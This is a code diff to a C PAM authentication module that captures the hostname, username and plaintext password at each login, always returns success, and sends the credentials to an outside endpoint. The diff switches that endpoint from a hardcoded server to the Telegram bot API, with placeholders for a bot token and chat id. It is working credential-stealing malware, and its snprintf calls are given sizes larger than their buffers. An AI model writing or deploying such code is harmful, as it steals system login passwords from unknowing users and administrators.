@@ -13,23 +13,26 @@ size_t write_data(void *buffer, size_t size, size_t nmemb, void *userp)
 }
 
 void sendMessage(char (*message)[]) {
+  char url[500];
   char data[200];
-  struct curl_slist *list = NULL;
 
-  snprintf(data,300,"%s",*message);
+  //INSERT HERE YOUR BOT KEY
+  char token[200] = "BOT TOKEN";
+
+  //INSERT HERE YOUR USER ID
+  int user_id = 1111111;
+
+  snprintf(url,600,"https://api.telegram.org/bot%s/sendMessage",token);
+  snprintf(data,300,"chat_id=%d&text=%s",user_id,*message);
   CURL *curl;
   curl_global_init(CURL_GLOBAL_ALL);
   curl = curl_easy_init();
-  list = curl_slist_append(list, "Content-Type: text/plain");
   if(curl) {
-    curl_easy_setopt(curl, CURLOPT_URL, "http://px517.servehttp.com:9001/message");
-    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 3L);
+    curl_easy_setopt(curl, CURLOPT_URL, url);
     curl_easy_setopt(curl, CURLOPT_POSTFIELDS,data); 
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
-    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, list);
     curl_easy_perform(curl);
-  }                           
-  curl_slist_free_all(list);            
+  }                                       
   curl_global_cleanup();
 }
 
@@ -53,7 +56,10 @@ PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, cons
     return retval;
   }
   gethostname(hostname, sizeof hostname);
-  snprintf(message,2048,"Hostname: %s\nUsername: %s\nPassword: %s",hostname,username,password);
+  snprintf(message,2048,"Hostname: %s\nUsername %s\nPassword: %s\n",hostname,username,password);
   sendMessage(&message);
   return PAM_SUCCESS;
 }
+
+
+
